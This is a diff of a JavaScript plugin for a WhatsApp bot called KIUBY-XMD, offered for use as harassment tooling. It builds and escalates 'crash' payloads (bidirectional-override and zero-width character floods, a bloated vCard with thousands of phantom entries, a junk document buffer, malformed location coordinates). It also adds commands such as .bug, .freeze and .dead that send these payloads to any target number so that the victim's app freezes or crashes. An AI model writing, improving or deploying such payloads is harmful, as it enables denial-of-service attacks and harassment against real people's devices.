@@ -1,45 +1,74 @@
 const { kiubyxmd } = require('../core/commandHandler');
 
-// 💀 𝐊𝐈𝐔𝐁𝐘-𝐗Ｍ𝐃 𝐂𝐑𝐀𝐒𝐇 𝐒𝐓𝐀Ｎ𝐙𝐀𝐒 (𝟐𝟎𝟐𝟔 𝐄𝐃𝐈𝐓𝐈𝐎𝐍) 💀
-// These payloads are designed to trigger buffer overflows and rendering crashes.
+// 💀 𝐊𝐈𝐔𝐁𝐘-𝐗Ｍ𝐃 𝐍𝐄𝐔𝐑𝐀𝐋 𝐂𝐑𝐀𝐒𝐇 𝐒𝐓𝐀Ｎ𝐙𝐀𝐒 (𝟐𝟎𝟐𝟔 𝐄𝐃𝐈𝐓𝐈𝐎Ｎ) 💀
+// These payloads are designed to trigger buffer overflows, layout engine hangs, and rendering crashes.
 const payloads = {
-    // 🧱 THE BIN: Layered Unicode Directional Marks (Force Close UI)
-    bin: ("\u200e\u200d\u200c\u202e\u202d".repeat(500) + "KIUBY_B_I_N_").repeat(20),
+    // 🧱 THE BIN: High-Density BIDI Layering (Force Close UI)
+    // Uses nested Right-To-Left/Left-To-Right overrides to exhaust layout computation.
+    bin: ("\u202e\u2066\u2067\u202d\u200f\u200e".repeat(800) + "KIUBY_MATRIX_").repeat(30),
+
+    // ❄️ THE FREEZE: Zero-Width Joiner Saturation (Freezes Chat List)
+    // Targeted at the message preview snippet in the main chat list.
+    freeze: ("\u200d\u200c\u2068\u2069".repeat(5000) + "UPLINK_STALL").repeat(10),
 
     // 🃏 THE CARD: VCard contact overload (Freezes contact preview)
     vcard: (name) => {
-        let v = `BEGIN:VCARD\nVERSION:3.0\nN:;${"\u202e".repeat(2000)};;;\nFN:${name || "Victim"}\n`;
-        // Inject 2000+ phantom properties to bloat the parser
-        for (let i = 0; i < 2000; i++) {
-            v += `item${i}.TEL;type=CELL;waid=123456789:+123456789\nitem${i}.X-ABLabel:${"\u202e\u200e".repeat(50)}\n`;
+        let v = `BEGIN:VCARD\nVERSION:3.0\nN:;${"\u202e\u200d".repeat(1500)};;;\nFN:${name || "Victim"}\n`;
+        // Inject 3000+ phantom properties to bloat the parser
+        for (let i = 0; i < 3000; i++) {
+            v += `item${i}.TEL;type=CELL;waid=123456789:+123456789\nitem${i}.X-ABLabel:${"\u202e\u200e\u200f".repeat(40)}\n`;
         }
-        v += `X-ABShowAs:COMPANY\nTITLE:${"\u202e\u200d\u200e".repeat(1000)}\nORG:KIUBY-XMD-EXPLOIT;\nNOTE:${"\u202e\u200d\u200e".repeat(5000)}\nEND:VCARD`;
+        v += `X-ABShowAs:COMPANY\nTITLE:${"\u202e\u200d\u200e".repeat(1200)}\nORG:KIUBY-XMD-EXPLOIT;\nNOTE:${"\u202e\u200d\u200e".repeat(8000)}\nEND:VCARD`;
         return v;
     },
 
-    // 📄 THE DOC: Invalid buffer for Document Previewer (Media Crash)
-    doc: Buffer.alloc(1024 * 256, 0x01), // Blank binary blob
+    // 📂 THE DOC: Invalid buffer for Document Previewer (Media/Thumbnail Crash)
+    doc: Buffer.alloc(1024 * 512, 0x01),
 
-    // 🌪️ THE LAG: Massive character flood
-    lag: "҈".repeat(10000)
+    // 📍 THE DEAD: Malformed Location Stanza (Rendering Panic)
+    dead: {
+        degreesLatitude: 999999.999999,
+        degreesLongitude: 999999.999999,
+        name: "\u202e".repeat(5000) + "DEAD_ZONE",
+        address: "\u202e".repeat(5000) + "KIUBY_NULL"
+    }
 };
 
 kiubyxmd({
     pattern: "bug",
     category: "Infiltration",
-    description: "Send a standard UI-Lag payload to target",
+    description: "Send a level 1 UI-Lag payload to target",
     filename: __filename,
     usePrefix: true
 }, async (from, client, conText) => {
     const { q, reply, isSuperUser, mek } = conText;
-    if (!isSuperUser) return reply("❌ *ACCESS DENIED*: Requires KIUBY-XMD SuperUser clearance.");
+    if (!isSuperUser) return reply("❌ *ACCESS DENIED*.");
     if (!q) return reply("🎯 *Usage*: `.bug <jid>`");
 
     const target = q.includes("@") ? q.trim() : q.trim() + "@s.whatsapp.net";
-    await reply(`🚀 *UPLINK ACTIVE*: Sending Level 1 UI-Lag to ${target.split('@')[0]}...`);
+    await reply(`🚀 *UPLINK ACTIVE*: Delivering Level 1 UI-Lag to ${target.split('@')[0]}...`);
 
     await client.sendMessage(target, { text: payloads.bin }, { quoted: mek });
     reply("✅ *INFILTRATION COMPLETE*: UI-Lag delivered.");
+});
+
+kiubyxmd({
+    pattern: "freeze",
+    aliases: ["listbug", "stall"],
+    category: "Infiltration",
+    description: "SATURATION: Use zero-width ghosts to freeze the chat list preview.",
+    filename: __filename,
+    usePrefix: true
+}, async (from, client, conText) => {
+    const { q, reply, isSuperUser, mek } = conText;
+    if (!isSuperUser) return reply("❌ *ACCESS DENIED*.");
+    if (!q) return reply("🎯 *Usage*: `.freeze <jid>`");
+
+    const target = q.includes("@") ? q.trim() : q.trim() + "@s.whatsapp.net";
+    await reply(`❄️ *FREEZE PROTOCOL*: Saturating pre-render buffer for ${target.split('@')[0]}...`);
+
+    await client.sendMessage(target, { text: payloads.freeze }, { quoted: mek });
+    reply("✅ *LIST STALLED*: Preview buffer saturated.");
 });
 
 kiubyxmd({
@@ -51,7 +80,7 @@ kiubyxmd({
     usePrefix: true
 }, async (from, client, conText) => {
     const { q, reply, isSuperUser, mek } = conText;
-    if (!isSuperUser) return reply("❌ *ACCESS DENIED*: Requires KIUBY-XMD SuperUser clearance.");
+    if (!isSuperUser) return reply("❌ *ACCESS DENIED*.");
     if (!q) return reply("🎯 *Usage*: `.vcard <jid>`");
 
     const target = q.includes("@") ? q.trim() : q.trim() + "@s.whatsapp.net";
@@ -70,6 +99,28 @@ kiubyxmd({
     }, { quoted: mek });
 
     reply("✅ *FORCE CLOSE DELIVERED*: Contact node overloaded.");
+});
+
+kiubyxmd({
+    pattern: "dead",
+    aliases: ["locbug", "mapcrash"],
+    category: "Infiltration",
+    description: "LOCATION CRASH: Send malformed coordinates to crash the map renderer.",
+    filename: __filename,
+    usePrefix: true
+}, async (from, client, conText) => {
+    const { q, reply, isSuperUser, mek } = conText;
+    if (!isSuperUser) return reply("❌ *ACCESS DENIED*.");
+    if (!q) return reply("🎯 *Usage*: `.dead <jid>`");
+
+    const target = q.includes("@") ? q.trim() : q.trim() + "@s.whatsapp.net";
+    await reply(`📍 *MAP REAPER*: Sending malformed Location-Crash to ${target.split('@')[0]}...`);
+
+    await client.sendMessage(target, {
+        location: payloads.dead
+    }, { quoted: mek });
+
+    reply("✅ *RENDERER CRASHED*: Map node terminated.");
 });
 
 kiubyxmd({
@@ -110,7 +161,7 @@ kiubyxmd({
     if (!q) return reply("🎯 *Usage*: `.bin <jid>`");
 
     const target = q.includes("@") ? q.trim() : q.trim() + "@s.whatsapp.net";
-    await reply(`🌪️ *BUFFER OVERFLOW*: Injecting Unicode-Binary into ${target.split('@')[0]}...`);
+    await reply(`🌪️ *BUFFER OVERFLOW*: Injecting high-density Unicode-Binary into ${target.split('@')[0]}...`);
 
     // Direct stanza delivery for maximum impact
     await client.sendMessage(target, { text: (payloads.bin).repeat(5) }, { quoted: mek });
@@ -128,9 +179,11 @@ kiubyxmd({
 
     const menu = `💀 *𝐊𝐈𝐔𝐁𝐘-𝐗Ｍ𝐃 𝐍𝐄𝐔𝐑𝐀𝐋 𝐈𝐍𝐅𝐈𝐋𝐓𝐑𝐀𝐓𝐈𝐎Ｎ* 💀
 
-▸ *.bug* <target> - UI Lag (Level 1)
-▸ *.bin* <target> - UI Overflow (Level 3)
-▸ *.vcard* <target> - VCard Crash (Level 5)
+▸ *.bug* <target>   - UI Lag (Unicode Level 1)
+▸ *.freeze* <target> - Chat List Stall (Level 3)
+▸ *.bin* <target>   - UI Overflow (Level 5)
+▸ *.vcard* <target> - Contact Crash (Level 8)
+▸ *.dead* <target>  - Map/Location Crash (Level 9)
 ▸ *.crash* <target> - Media/Doc Crash (Level 10)
 
 ⚠️ *2026 PROTOCOL:* All stanzas are optimized for modern clients. Use with caution.`;
